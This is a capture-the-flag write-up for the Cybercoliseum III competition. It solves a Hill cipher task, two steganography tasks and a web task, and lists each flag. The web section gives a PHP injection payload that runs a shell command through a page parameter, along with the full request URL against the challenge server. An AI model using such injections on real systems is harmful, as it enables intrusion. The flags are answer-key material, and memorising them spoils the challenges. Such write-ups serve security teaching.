# Cybercoliseum Ⅲ Write-up

## Crypto 

### Crypto - Hills

Cipher

    -------------------------
    |76 |101|115|116|101|114|
    -------------------------
    |32 |83 |97 |110|100|101|
    -------------------------
    |114|115|32 |115|104|111|
    -------------------------
    |117|108|100|32 |104|101|
    -------------------------
    |108|112|32 |121|111|117|
    -------------------------
    |32 |58 |41 |41 |41 |42 |
    -------------------------
    
    KLZCOUKTVOUWUKDOBGZVJIIIRGVHXCRQUCNOX_IBBL 

This is `Hill Cipher`, see how it works or use an online decoder

https://www.dcode.fr/hill-cipher

![image](https://github.com/zer00d4y/writeups/assets/128820441/9ecc3648-419b-420c-810b-610e830a553b)

FLAG:

    CODEBY{BTW_EXISTS_AN_INTERESTING_FILM_ABOUT_HILLS}

## WEB

### WEB - Old version

![image](https://github.com/zer00d4y/writeups/assets/128820441/593b6532-10e1-492c-9145-ee326ab772ca)

Here we see that this is an LFI vulnerability.

Payload:         
            
        ' and die(system("cat index.php")) or '

http://62.173.140.174:46005/index.php?page=' and die(system("cat index.php")) or '

FLAG:

    CODEBY{php_lf1_t0_rc3_d0ne}

## Steganography

### Stego - Omniscient

![Omniscient](https://github.com/zer00d4y/writeups/assets/128820441/571b6a77-6ef2-4a46-9bca-d6336364c01a)

Use stegsolve or other tools and set `Alpha plane 1` mode 

Stegsolve: https://github.com/zer00d4y/stegsolve

![image](https://github.com/zer00d4y/writeups/assets/128820441/f373baee-8cdb-4be7-8b9b-e70c69556b54)

FLAG: 

    CODEBY{4nd_i_c4n_se3}

### Stego - Neural network

![task](https://github.com/zer00d4y/writeups/assets/128820441/42ed85de-1a92-4a22-a9bb-a4f23c734489)

We see that one sentence is written with different case

Replace small letters with A, capital letters with B

`In TexT steGaNograpHY, the SECRet MEsSage Is tYPiCallY emBdded bY making suBtIE MOdiFIcATioNs`

`BA BAAB AAABABAAAAABB AAA BBBBAA BBABAAA BA ABBABAAAB AABAAAA AB AAAAAA AABABB BBAABBABBAABA`

[Bacon Cipher decoder](https://www.dcode.fr/bacon-cipher)

FLAG:

    CODEBY{URIGHTITISBAC?NS}
